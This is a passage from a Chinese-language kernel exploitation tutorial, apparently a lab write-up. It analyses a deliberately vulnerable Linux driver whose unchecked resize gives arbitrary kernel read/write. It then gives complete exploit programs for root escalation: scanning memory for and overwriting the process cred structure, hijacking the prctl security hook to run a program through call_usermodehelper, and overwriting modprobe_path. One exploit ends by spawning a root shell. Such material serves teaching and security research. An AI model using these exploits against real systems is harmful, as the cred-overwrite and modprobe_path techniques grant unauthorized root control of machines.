    g_mem_buffer = kmem_cache_alloc_trace(kmalloc_caches[5], 0x24000C0LL, 0x18LL);
    if ( !g_mem_buffer )
        return 0LL;
    g_mem_buffer-&gt;data = _kmalloc(s_args, 0x24000C0LL);
    if ( g_mem_buffer-&gt;data )
    `{`
        g_mem_buffer-&gt;data_size = s_args;
        g_mem_buffer-&gt;pos = 0LL;
        printk(&amp;unk_6F8,g_mem_buffer-&gt;data_size); // 6[x] Allocated memory with size %lu [x]
    `}`
    else
    `{`
        kfree(g_mem_buffer);
    `}`
    return 0LL;
`}`

00000000 init_args       struc ; (sizeof=0x8, align=0x8, copyof_518)
00000000 size            dq ?
00000008 init_args       ends

00000000 mem_buffer_0    struc ; (sizeof=0x18, align=0x8, copyof_517)
00000000 data_size       dq ?
00000008 data            dq ?                    ; offset
00000010 pos             dq ?
00000018 mem_buffer_0    ends
```

**依据`s_args -&gt; grow`是否被置位来决定是增加或是减少`g_mem_buffer-&gt;data_size`，并重新分配一个相应大小加一的chunk，交互码`0x8008FE08`：**

```
case 0x8008FE08:
if ( !copy_from_user(&amp;s_args, v3, 16LL) &amp;&amp; g_mem_buffer )
`{`
    if ( s_args -&gt; grow )
        new_size = g_mem_buffer-&gt;data_size + s_args -&gt; size;
    else
        new_size = g_mem_buffer-&gt;data_size - s_args -&gt; size;
    g_mem_buffer-&gt;data = (char *)krealloc(g_mem_buffer-&gt;data, new_size + 1, 0x24000C0LL);
    if ( !g_mem_buffer-&gt;data )
        return -12LL;
    g_mem_buffer-&gt;data_size = new_size;
    printk(&amp;unk_728,g_mem_buffer-&gt;data_size); // 6[x] g_mem_buffer-&gt;data_size = %lu [x]
    return 0LL;
`}`

00000000 realloc_args    struc ; (sizeof=0x10, align=0x8, copyof_520)
00000000 grow            dd ?
00000004                 db ? ; undefined
00000005                 db ? ; undefined
00000006                 db ? ; undefined
00000007                 db ? ; undefined
00000008 size            dq ?
00000010 realloc_args    ends
```

**从`g_mem_buffer-&gt;data[g_mem_buffer-&gt;pos]`处向用户传入的`buff`写`count`字节，交互码`0x8008FE09`：**

```
if ( cmd != 0xC008FE09 )
    return 0LL;
if ( !copy_from_user(&amp;s_args, v3, 16LL) &amp;&amp; g_mem_buffer )
`{`
    pos = g_mem_buffer-&gt;pos;
    result = -22LL;
    if ( s_args -&gt; count + pos &lt;= g_mem_buffer-&gt;data_size )
        result = copy_to_user(s_args -&gt; buff, &amp;g_mem_buffer-&gt;data[pos], s_args -&gt; count);
    return result;
`}`

00000000 read_args       struc ; (sizeof=0x10, align=0x8, copyof_522)
00000000 buff            dq ?                    ; offset
00000008 count           dq ?
00000010 read_args       ends
```

**依据用户输入更新`g_mem_buffer-&gt;pos`，交互码`0x8008FE0A`：**

```
case 0x8008FE0A:
if ( !copy_from_user(&amp;s_args, v3, 8LL) )
`{`
    result = -22LL;
    if ( g_mem_buffer )
    `{`
        v16 = (signed int)s_args;
        result = 0LL;
        if ( s_args -&gt; new_pos &lt; g_mem_buffer-&gt;data_size )
        `{`
            g_mem_buffer-&gt;pos =  s_args -&gt; new_pos;
            result = v16;
        `}`
    `}`
    return result;
`}`

00000000 seek_args       struc ; (sizeof=0x8, align=0x8, copyof_524)
00000000 new_pos         dq ?
00000008 seek_args       ends
```

**向`g_mem_buffer-&gt;data[g_mem_buffer-&gt;pos]`处写`count`字节由用户传入的`buff`，交互码`0x8008FE0B`：**

```
if ( cmd == 0x8008FE0B )
`{`
    if ( !copy_from_user(&amp;s_args, v3, 16LL) &amp;&amp; g_mem_buffer )
    `{`
        result = -22LL;
        if ( s_args -&gt; count + g_mem_buffer -&gt; pos &lt;= g_mem_buffer -&gt; data_size )
          result = copy_from_user(&amp;g_mem_buffer-&gt;data[g_mem_buffer-&gt; pos], 
                                  s_args -&gt; buff, 
                                  s_args -&gt; count);
        return result;
    `}`
`}`

00000000 write_args      struc ; (sizeof=0x10, align=0x8, copyof_526)
00000000 buff            dq ?                    ; offset
00000008 count           dq ?
00000010 write_args      ends
```

很明显，在重分配逻辑中，模块没有对`new_size`进行检查，如果我们传入的`s_args -&gt; size`使得`new_size`为`-1`，程序将会接下来进行`kmalloc(0)`，随后我们会获得一个`0x10`大小的`Chunk`，但是随后我们的`g_mem_buffer -&gt; data_size`将会被更新为`0xFFFFFFFFFFFFFFFF`，这意味着我们拥有了任意地址写的能力。

我们触发任意地址写的代码是：

```
struct init_args i_args;
struct realloc_args r_args;
i_args.size=0x100;
ioctl(fd, 0x8008FE07, &amp;i_args);

r_args.grow = 0;
r_args.size = 0x100 + 1;
ioctl(fd, 0x8008FE08, &amp;r_args);
puts("[+] Now! We can read and write any memory! [+]");
```

### 第一种提权姿势-劫持`cred`结构体

#### 关于`cred`结构体

每个线程在内核中都对应一个线程栈，并由一个线程结构块`thread_info`去调度，`thread_info`结构体同时也包含了线程的一系列信息，它一般被存放位于线程栈的最低地址。

结构体定义在`/v4.6-rc1/source/arch/x86/include/asm/thread_info.h#L55`：

```
struct thread_info `{`
    struct task_struct    *task;        /* main task structure */
    __u32                flags;        /* low level flags */
    __u32                status;        /* thread synchronous flags */
    __u32                cpu;        /* current CPU */
    mm_segment_t        addr_limit;
    unsigned int        sig_on_uaccess_error:1;
    unsigned int        uaccess_err:1;    /* uaccess failed */
`}`;
```

`thread_info`中最重要的成员是`task_struct`结构体,它被定义在`/v4.6-rc1/source/include/linux/sched.h#L1394`

```
struct task_struct `{`
    volatile long state;    /* -1 unrunnable, 0 runnable, &gt;0 stopped */
    void *stack;
    atomic_t usage;
    unsigned int flags;    /* per process flags, defined below */
    unsigned int ptrace;

    ......

    unsigned long nvcsw, nivcsw; /* context switch counts */
    u64 start_time;        /* monotonic time in nsec */
    u64 real_start_time;    /* boot based time in nsec */
    /* 
     * mm fault and swap info: this can arguably be seen as either 
     * mm-specific or thread-specific 
     */
    unsigned long min_flt, maj_flt;

    struct task_cputime cputime_expires;
    struct list_head cpu_timers[3];

    /* process credentials */

    // objective and real subjective task credentials (COW) 
    const struct cred __rcu *real_cred; 
    // effective (overridable) subjective task credentials (COW)
    const struct cred __rcu *cred;
    /*
     * executable name excluding path
     * - access with [gs]et_task_comm (which lockit with task_lock())
     * - initialized normally by setup_new_exec
     */
    char comm[TASK_COMM_LEN]; 

    /* file system info */
    struct nameidata *nameidata;

#ifdef CONFIG_SYSVIPC
    /* ipc stuff */
    struct sysv_sem sysvsem;
    struct sysv_shm sysvshm;
#endif

    ......
`}`;
```

`cred`结构体表示该线程的权限，它定义在`/v4.6-rc1/source/include/linux/cred.h#L118`

```
struct cred `{`
    atomic_t    usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
    atomic_t    subscribers;            /* number of processes subscribed */
    void        *put_addr;
    unsigned    magic;
#define CRED_MAGIC    0x43736564
#define CRED_MAGIC_DEAD    0x44656144
#endif
    kuid_t        uid;                    /* real UID of the task */
    kgid_t        gid;                    /* real GID of the task */
    kuid_t        suid;                    /* saved UID of the task */
    kgid_t        sgid;                    /* saved GID of the task */
    kuid_t        euid;                    /* effective UID of the task */
    kgid_t        egid;                    /* effective GID of the task */
    kuid_t        fsuid;                    /* UID for VFS ops */
    kgid_t        fsgid;                    /* GID for VFS ops */
    unsigned    securebits;                /* SUID-less security management */
    kernel_cap_t    cap_inheritable;     /* caps our children can inherit */
    kernel_cap_t    cap_permitted;        /* caps we're permitted */
    kernel_cap_t    cap_effective;        /* caps we can actually use */
    kernel_cap_t    cap_bset;            /* capability bounding set */
    kernel_cap_t    cap_ambient;        /* Ambient capability set */
#ifdef CONFIG_KEYS
    unsigned char    jit_keyring;        /* default keyring to attach requested keys to */
    struct key __rcu *session_keyring;    /* keyring inherited over fork */
    struct key    *process_keyring;         /* keyring private to this process */
    struct key    *thread_keyring;         /* keyring private to this thread */
    struct key    *request_key_auth;         /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
    void        *security;                /* subjective LSM security */
#endif
    struct user_struct *user;            /* real user ID subscription */
    struct user_namespace *user_ns;     /* user_ns the caps and keyrings are relative to. */
    struct group_info *group_info;        /* supplementary groups for euid/fsgid */
    struct rcu_head    rcu;                /* RCU deletion hook */
`}`;
```

我们只要将结构体的`uid~fsgid`(即前`28`个字节)全部覆写为`0`即可提权该线程(`root uid`为`0`)

#### 寻找`cred`结构体

那么首先，我们需要在内存中找到`cred`结构体的位置才能真正对其进行写操作。

`task_struct`里有个`char comm[TASK_COMM_LEN];`成员，可通过`PRCTL`函数中的`PR_SET_NAME`功能，设置为指定的一个小于`16`字节的字符串：

```
char target[16] = "This_is_target!";
prctl(PR_SET_NAME,target);
```

`task_struct`是通过调用`kmem_cache_alloc_node()`分配的，所以`task_struct`应该存在于内核的动态分配区域。因此我们的寻找范围应该在`0xFFFF880000000000~0xFFFFC80000000000`。

```
size_t cred , real_cred , target_addr;
char *buff = malloc(0x1000);

for (size_t addr=0xFFFF880000000000; addr&lt;0xFFFFC80000000000; addr+=0x1000)
`{`
    struct seek_args s_args;
    struct read_args r_args;

    s_args.new_pos = addr - 0x10;
    ioctl(fd, 0x8008FE0A, &amp;s_args);

    r_args.buff = buff;
    r_args.count = 0x1000;
    ioctl(fd, 0xC008FE09, &amp;r_args);

    int result = memmem(buff,0x1000,target,16);
    if (result)
    `{`
        printf("[+] Find try2findmesauce at : %pn",result);
        cred = *(size_t *)(result - 0x8);
        real_cred = *(size_t *)(result - 0x10);
        if ((cred || 0xff00000000000000) &amp;&amp; (real_cred == cred))
        `{`
            target_addr = addr+result-(long int)(buff);
            printf("[+] found task_struct 0x%xn",target_addr);
            printf("[+] found cred 0x%lxn",real_cred);
            break;
        `}`
    `}`
`}`
```

#### 篡改`cred`结构体

我们在这里将结构体的`uid~fsgid`(即前`28`个字节)全部覆写为`0`。

```
int root_cred[12];
memset((char *)root_cred,0,28);

struct seek_args s_args1;
struct write_args w_args;

s_args1.new_pos=cred-0x10;
ioctl(fd,0x8008FE0A,&amp;s_args1);
w_args.buff=root_cred;
w_args.count=28;
ioctl(fd,0x8008FE0B,&amp;w_args);
```

#### 最终`Exploit`

本`Exploit`里面有一些适配窝使用的`Kernel`调试框架而写的接口代码块，不会对利用方式以及利用结果产生影响~

```
//gcc ./exploit.c -o exploit -static -fno-stack-protector -masm=intel -lpthread
#include &lt;sys/mman.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sched.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/ipc.h&gt;
#include &lt;sys/msg.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/prctl.h&gt;

void init()`{`
        setbuf(stdin,0);
        setbuf(stdout,0);
        setbuf(stderr,0);
`}`

size_t user_cs, user_rflags, user_ss, user_rsp;

struct init_args
`{`
    size_t size;
`}`;

struct realloc_args
`{`
    int grow;
    size_t size;
`}`;

struct read_args
`{`
    size_t buff;
    size_t count;
`}`;

struct seek_args
`{`
    size_t new_pos;
`}`;

struct write_args
`{`
    size_t buff;
    size_t count;
`}`;

void save_user_status()`{`
    __asm__(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    puts("[+] Save User Status");
    printf("user_cs = %pn",user_cs);
    printf("user_ss = %pn",user_ss);
    printf("user_rsp = %pn",user_rsp);
    printf("user_rflags = %pn",user_rflags);
    puts("[+] Save Success");
`}`

void exploit()`{`
    int fd = open("/dev/vulnerable_device",0);
    if (fd &lt; 0)`{`
        puts("open fail!");
        return 0;
    `}`

    struct init_args i_args;
    struct realloc_args r_args;
    i_args.size=0x100;
    ioctl(fd, 0x8008FE07, &amp;i_args);

    r_args.grow=0;
    r_args.size=0x100+1;
    ioctl(fd, 0x8008FE08,&amp;r_args);
    puts("[+] We can read and write any memory! [+]");

    char target[16] = "This_is_target!";
    prctl(PR_SET_NAME,target);

    size_t cred = 0 , real_cred , target_addr;
    char *buff = malloc(0x1000);

    for (size_t addr=0xFFFF880000000000; addr&lt;0xFFFFC80000000000; addr+=0x1000)
    `{`
        struct seek_args s_args;
        struct read_args r_args;

        s_args.new_pos = addr - 0x10;
        ioctl(fd, 0x8008FE0A, &amp;s_args);

        r_args.buff = buff;
        r_args.count = 0x1000;
        ioctl(fd, 0xC008FE09, &amp;r_args);

        int result = memmem(buff,0x1000,target,16);
        if (result)
        `{`
            printf("[+] Find try2findmesauce at : %pn",result);
            cred = *(size_t *)(result - 0x8);
            real_cred = *(size_t *)(result - 0x10);
            if ((cred || 0xff00000000000000) &amp;&amp; (real_cred == cred))
            `{`
                target_addr = addr+result-(long int)(buff);
                printf("[+] found task_struct 0x%xn",target_addr);
                printf("[+] found cred 0x%lxn",real_cred);
                break;
            `}`
        `}`
    `}`
    if (cred==0)
    `{`
        puts("[-] not found, try again! n");
        exit(-1);
    `}`

    int root_cred[12];
    memset((char *)root_cred,0,28);

    struct seek_args s_args1;
    struct write_args w_args;

    s_args1.new_pos=cred-0x10;
    ioctl(fd,0x8008FE0A,&amp;s_args1);
    w_args.buff=root_cred;
    w_args.count=28;
    ioctl(fd,0x8008FE0B,&amp;w_args);

`}`

int main(int argc,char * argv[])`{`
    init();
    if(argc &gt; 1)`{`
        if(!strcmp(argv[1],"--breakpoint"))`{`
            printf("[%p]n",exploit);
        `}`
        return 0;
    `}`
    save_user_status();

    exploit();

    if(getuid() == 0) `{`
        printf("[!!!] Now! You are root! [!!!]n");
        system("/bin/sh");
    `}`else`{`
        printf("[XXX] Fail! Something wrong！ [XXX]n");
    `}`
    return 0;
`}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-04-27-115805.png)

#### <a class="reference-link" name="%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93"></a>姿势总结
1. 这种提权姿势最核心的就是修改`cred`结构体。
1. 除了任意地址读写，如果分配的大小合适，我们可以利用`Use-After-Free`直接控制整个结构体进行修改。
1. **这种方案不受`kaslr`保护的影响！**
### 第二种提权姿势-劫持`prctl`函数调用`call_usermodehelper()`

#### 关于`prctl`函数

`prctl`函数在`/v4.6-rc1/source/kernel/sys.c#L2075`处实现

```
SYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3,
        unsigned long, arg4, unsigned long, arg5)
`{`
    ......

    error = security_task_prctl(option, arg2, arg3, arg4, arg5);
    if (error != -ENOSYS)
        return error;

    ......

`}`
```

可以发现，当我们调用`prctl`时，它会调用`security_task_prctl`并传入五个参数。

`security_task_prctl`函数在`/v4.6-rc1/source/security/security.c#L990`处实现。

```
int security_task_prctl(int option, unsigned long arg2, unsigned long arg3,
             unsigned long arg4, unsigned long arg5)
`{`
    int thisrc;
    int rc = -ENOSYS;
    struct security_hook_list *hp;

    list_for_each_entry(hp, &amp;security_hook_heads.task_prctl, list) `{`
        thisrc = hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);
        if (thisrc != -ENOSYS) `{`
            rc = thisrc;
            if (thisrc != 0)
                break;
        `}`
    `}`
    return rc;
`}`
```

函数会调用`hp-&gt;hook.task_prctl`，若我们拥有任意地址写的能力，我们就可以通过调试确定这个指针的位置，进而劫持这个指针执行任意代码。

**此处有一个细节，传入该函数的五个参数中，第一个参数是`int`型参数，也就是说，我们所要执行的代码，其接受的第一个参数必须在`32`位范围内，超出的部分将被直接截断，这直接限制了我们在`64`位下开展相关利用！**

#### 关于`call_usermodehelper`函数

`call_usermodehelper`函数在`/v4.6-rc1/source/kernel/kmod.c#L616`处实现，此处我们不去深究它的具体实现，在官方文档中，这个函数的描述如下：

##### <a class="reference-link" name="%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B"></a>函数原型

```
int call_usermodehelper(char *path, char **argv, char **envp, int wait)

```

##### <a class="reference-link" name="%E5%87%BD%E6%95%B0%E7%94%A8%E9%80%94"></a>函数用途

准备并启动用户模式应用程序

##### <a class="reference-link" name="%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0"></a>函数参数
<li>
[@path](https://github.com/path)：用户态可执行文件的路径</li>
<li>
[@argv](https://github.com/argv)：进程的参数列表</li>
<li>
[@envp](https://github.com/envp)：进程环境变量</li>
<li>
[@wait](https://github.com/wait): 是否为了这个应用程序进行阻塞，直到该程序运行结束并返回其状态。(当设置为`UMH_NO_WAIT`时，将不进行阻塞，但是如果程序发生问题，将不会收到任何有用的信息，这样就可以安全地从中断上下文中进行调用。)</li>
##### <a class="reference-link" name="%E5%87%BD%E6%95%B0%E5%A4%87%E6%B3%A8"></a>函数备注

此函数等效于使用`call_usermodehelper_setup()`和`call_usermodehelper_exec()`。

简而言之，这个函数可以在内核中直接新建和运行用户空间程序，并且该程序具有root权限，因此只要将参数传递正确就可以执行任意命令(注意命令中的参数要用全路径，不能用相对路径)

⚠：在讲述此种利用原理的[原文章](http://powerofcommunity.net/poc2016/x82.pdf)中提到在安卓利用时需要关闭`SEAndroid`机制。

这里可以注意到，尽管`call_usermodehelper`可以很方便的使我们拥有从任意地址读写到任意代码执行的能力，但是，它的第一个参数仍然是一个地址，在`64`位下，它依然会被截断！

#### 间接调用`call_usermodehelper`函数

此处我们可以借鉴一下`ROP`的思路，如果能有其他的函数，它的内部调用了`call_usermodehelper`函数，且我们需要传入的第一个参数可以是`32`位值的话，我们就可以对其进行利用。

这里我们能找到一条利用链，首先是定义在`/v4.6-rc1/source/kernel/reboot.c#L392`的`run_cmd`函数

```
static int run_cmd(const char *cmd)
`{`
    char **argv;
    static char *envp[] = `{`
        "HOME=/",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL
    `}`;
    int ret;
    argv = argv_split(GFP_KERNEL, cmd, NULL);
    if (argv) `{`
        ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
        argv_free(argv);
    `}` else `{`
        ret = -ENOMEM;
    `}`

    return ret;
`}`
```

但是，它的第一个参数仍是`64-bit`下的指针，于是我们继续寻找调用链。

可以看到定义在`/v4.6-rc1/source/kernel/reboot.c#L427`的`__orderly_poweroff`调用了`run_cmd`且其接受的参数为一个布尔值：

```
static int __orderly_poweroff(bool force)
`{`
    int ret;

    ret = run_cmd(poweroff_cmd);

    if (ret &amp;&amp; force) `{`
        pr_warn("Failed to start orderly shutdown: forcing the issuen");

        /*
         * I guess this should try to kick off some daemon to sync and
         * poweroff asap.  Or not even bother syncing if we're doing an
         * emergency shutdown?
         */
        emergency_sync();
        kernel_power_off();
    `}`

    return ret;
`}`
```

那么我们只要能劫持`poweroff_cmd`，我们就可以执行任意命令

而我们恰好可以在`/v4.6-rc1/source/kernel/reboot.c#L389`处找到如下定义：

```
char poweroff_cmd[POWEROFF_CMD_PATH_LEN] = "/sbin/poweroff";
static const char reboot_cmd[] = "/sbin/reboot";
```

此处可以发现，`reboot_cmd`开启了`static const`标识符，这将导致我们无法通过劫持`__orderly_reboot`进行利用。

#### 劫持`prctl`函数

我们首先确定`prctl`函数的地址。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-04-30-134435.png)

接下来我们写一个小的实例程序来确定`hp-&gt;hook.task_prctl`位置

```
#include &lt;sys/prctl.h&gt;  
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;

void exploit()`{`
    prctl(0,0);
`}`

int main(int argc,char * argv[])`{`
    if(argc &gt; 1)`{`
        if(!strcmp(argv[1],"--breakpoint"))`{`
            printf("[%p]n",exploit);
        `}`
        return 0;
    `}`
    exploit();
    return 0;
`}`
```

我们在`security_task_prctl`函数处下断，然后逐步跟进，直到遇到调用`hp-&gt;hook.task_prctl`处。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-04-29-154306.png)

因此我们需要劫持的目标就是`0xFFFFFFFF81EB56B8`。

#### 篡改`reboot_cmd`并调用`__orderly_reboot`

首先查看确定`poweroff_cmd`和`__orderly_poweroff`的地址，结果发现内核中并没有该函数的地址，但是发现定义在`/v4.6-rc1/source/kernel/reboot.c#L450`的`poweroff_work_func`会调用`__orderly_poweroff`，且接受的参数并没有被利用：

```
static void poweroff_work_func(struct work_struct *work)
`{`
    __orderly_poweroff(poweroff_force);
`}`
```

那么我们转而试图去确定`poweroff_work_func`函数的地址。

[![](https://img.lhyerror404.cn/error404/2020-04-30-153505.png)](https://img.lhyerror404.cn/error404/2020-04-30-153505.png)

接下来我们开始调试，分别在`call_usermodehelper`和`poweroff_work_func`处下断

我们事先编译一个`rootme`程序：

```
// gcc ./rootme.c -o rootme -static -fno-stack-protector

#include&lt;stdlib.h&gt;

int main()`{`
    system("touch /tmp/test");
    return 0;
`}`
```

我们使用的`Exploit`如下：

```
// gcc ./exploit.c -o exploit -static -fno-stack-protector -masm=intel -lpthread

int write_mem(int fd, size_t addr,char *buff,int count)
`{`
    struct seek_args s_args1;
    struct write_args w_args;
    int ret;

    s_args1.new_pos=addr-0x10;
    ret=ioctl(fd,0x8008FE0A,&amp;s_args1);
    w_args.buff=buff;
    w_args.count=count;
    ret=ioctl(fd,0x8008FE0B,&amp;w_args);
    return ret;
`}`

void exploit()`{`

    int fd = open("/dev/vulnerable_device",0);
    if (fd &lt; 0)`{`
        puts("open fail!");
        return 0;
    `}`

    struct init_args i_args;
    struct realloc_args r_args;
    i_args.size=0x100;
    ioctl(fd, 0x8008FE07, &amp;i_args);

    r_args.grow=0;
    r_args.size=0x100+1;
    ioctl(fd, 0x8008FE08,&amp;r_args);
    puts("[+] We can read and write any memory! [+]");

    size_t hook_task_prctl = 0xFFFFFFFF81EB56B8;
    size_t reboot_work_func_addr = 0xffffffff810a49a0;
    size_t reboot_cmd_addr = 0xffffffff81e48260;
    char* buff = malloc(0x1000);
    memset(buff,'x00',0x1000);
    strcpy(buff,"/rootme");
    write_mem(fd,reboot_cmd_addr, buff,strlen(buff)+1);
    memset(buff,'x00',0x1000);
    *(size_t *)buff = reboot_work_func_addr;
    write_mem(fd,hook_task_prctl,buff,8);

    if (fork()==0)`{`
        printf("OK!");
        prctl(0);
        exit(-1);
    `}`
`}`

int main(int argc,char * argv[])`{`
    init();
    if(argc &gt; 1)`{`
        if(!strcmp(argv[1],"--breakpoint"))`{`
            printf("[%p]n",exploit);
        `}`
        return 0;
    `}`
    save_user_status();

    exploit();

    printf("[+] Done!n");
    return 0;
`}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-04-30-153838.png)

首先这里我们意外的发现，`poweroff_work_func`函数就已经直接调用`run_cmd`函数了，也就是说，`poweroff_work_func`函数其实就是`__orderly_poweroff`函数！

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-04-30-154235.png)

接下来我们可以看到通过`call_usermodehelper`调用`/rootme`的具体参数布置。

最后，我们看到，我们事先布置的`rootme`程序已被执行

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-04-30-154445.png)

#### <a class="reference-link" name="%E6%9C%80%E7%BB%88%E6%8F%90%E6%9D%83"></a>最终提权

`call_usermodeheler`函数创建的新程序，实际上作为`keventd`内核线程的子进程运行，因此具有root权限。 新程序被扔到内核工作队列`khelper`中进行执行。

由于不好表征我们已经提权成功（可以选用反向`shell`），我们此处在文件系统的根目录设置一个`flag`文件，所属用户设置为`root`，权限设置为`700`。即在`Init`文件中添加

```
chown root /flag
chmod 700 /flag
```

接下来我们替换`rootme`程序为一个更改`flag`权限的程序

```
#include&lt;stdlib.h&gt;

int main()`{`
    printf("Exec command in root ing......");
    system("chmod 777 /flag");
    printf("Exec command end!");
    return 0;
`}`
```

再次运行`Exploit`

[![](https://img.lhyerror404.cn/error404/2020-04-30-162038.png)](https://img.lhyerror404.cn/error404/2020-04-30-162038.png)

#### <a class="reference-link" name="%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93"></a>姿势总结
1. 这种提权姿势最核心的就是劫持`hp-&gt;hook.task_prctl`函数指针执行任意代码，第一个传入参数只能是一个`32`位的变量。
<li>
`call_usermodehelper`可以很方便的以`root`权限启动任意程序，但是可能没有回显，因此可以考虑使用`reverse_shell`。</li>
1. **这种方案不受`SMEP`、`SMAP`保护的影响！**
#### 其他间接调用`call_usermodehelper`函数的函数
<li>
`__request_module`函数函数实现于`/v4.6-rc1/source/kernel/kmod.c#L124`
<pre><code class="lang-c hljs cpp">int __request_module(bool wait, const char *fmt, ...)
`{`
    ......

    ret = call_modprobe(module_name, wait ? UMH_WAIT_PROC : UMH_WAIT_EXEC);

    atomic_dec(&amp;kmod_concurrent);
    return ret;
`}`
EXPORT_SYMBOL(__request_module);
</code></pre>
`call_modprobe`实现于`/v4.6-rc1/source/kernel/kmod.c#L69`
<pre><code class="lang-c hljs cpp">static int call_modprobe(char *module_name, int wait)
`{`
    struct subprocess_info *info;
    static char *envp[] = `{`
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
        NULL
    `}`;

    char **argv = kmalloc(sizeof(char *[5]), GFP_KERNEL);
    if (!argv)
        goto out;

    module_name = kstrdup(module_name, GFP_KERNEL);
    if (!module_name)
        goto free_argv;

    argv[0] = modprobe_path;
    argv[1] = "-q";
    argv[2] = "--";
    argv[3] = module_name;    /* check free_modprobe_argv() */
    argv[4] = NULL;

    info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,
                     NULL, free_modprobe_argv, NULL);
    if (!info)
        goto free_module_name;

    return call_usermodehelper_exec(info, wait | UMH_KILLABLE);

free_module_name:
    kfree(module_name);
free_argv:
    kfree(argv);
out:
    return -ENOMEM;
`}`
</code></pre>
`modprobe_path`定义于`/v4.6-rc1/source/kernel/kmod.c#L61`
<pre><code class="lang-c hljs cpp">/*
    modprobe_path is set via /proc/sys.
*/
char modprobe_path[KMOD_PATH_LEN] = "/sbin/modprobe";
</code></pre>
于是我们只需要劫持`modprobe_path`然后执行`__request_module`即可，但是，此函数除了我们劫持函数指针来主动调用以外，我们还可以使用**运行一个错误格式的elf文件**的方式来触发`__request_module`。
我们可以使用如下`Exploit`：
<pre><code class="lang-c hljs cpp">void exploit()`{`

    int fd = open("/dev/vulnerable_device",0);
    if (fd &lt; 0)`{`
        puts("open fail!");
        return 0;
    `}`

    struct init_args i_args;
    struct realloc_args r_args;
    i_args.size=0x100;
    ioctl(fd, 0x8008FE07, &amp;i_args);

    r_args.grow=0;
    r_args.size=0x100+1;
    ioctl(fd, 0x8008FE08,&amp;r_args);
    puts("[+] We can read and write any memory! [+]");

    size_t reboot_cmd_addr = 0xffffffff81e46ae0; // ffffffff81e46ae0 D modprobe_path
    char* buff = malloc(0x1000);
    memset(buff,'x00',0x1000);
    strcpy(buff,"/rootme");
    write_mem(fd,reboot_cmd_addr, buff,strlen(buff)+1);

`}`
</code></pre>
[![](https://img.lhyerror404.cn/error404/2020-05-01-060627.png)](https://img.lhyerror404.cn/error404/2020-05-01-060627.png)
</li>
<li>
`kobject_uevent_env`函数函数实现于`/v4.6-rc1/source/lib/kobject_uevent.c#L164`
<pre><code class="lang-c hljs cpp">/**
 * kobject_uevent_env - send an uevent with environmental data
 *
 * [@action](https://github.com/action): action that is happening
 * [@kobj](https://github.com/kobj): struct kobject that the action is happening to
 * [@envp_ext](https://github.com/envp_ext): pointer to environmental data
 *
 * Returns 0 if kobject_uevent_env() is completed with success or the
 * corresponding error when it fails.
 */
int kobject_uevent_env(struct kobject *kobj, enum kobject_action action,
               char *envp_ext[])
`{`

    ......

#ifdef CONFIG_UEVENT_HELPER
    /* call uevent_helper, usually only enabled during early boot */
    if (uevent_helper[0] &amp;&amp; !kobj_usermode_filter(kobj)) `{`
        struct subprocess_info *info;

        retval = add_uevent_var(env, "HOME=/");
        if (retval)
            goto exit;
        retval = add_uevent_var(env,
                    "PATH=/sbin:/bin:/usr/sbin:/usr/bin");
        if (retval)
            goto exit;
